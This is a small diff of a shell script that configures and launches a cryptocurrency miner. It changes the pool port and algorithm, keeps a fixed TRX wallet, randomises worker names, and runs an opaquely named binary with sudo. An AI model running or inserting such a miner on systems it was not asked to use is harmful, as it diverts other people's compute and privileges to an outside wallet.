@@ -1,5 +1,5 @@
-POOL=rx-us.unmineable.com:1333
+POOL=rx-us.unmineable.com:13333
 WALLET=TRX:TUgMbsfpzfFvFZnGjueLo6MxHcxHrMXJXy
 WORKER=$(echo $(shuf -i 1-999999999 -n 1)-FA)
-ALGO=TurtleCoin
+ALGO=NinjaCoin
 sudo ./kontol --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO 
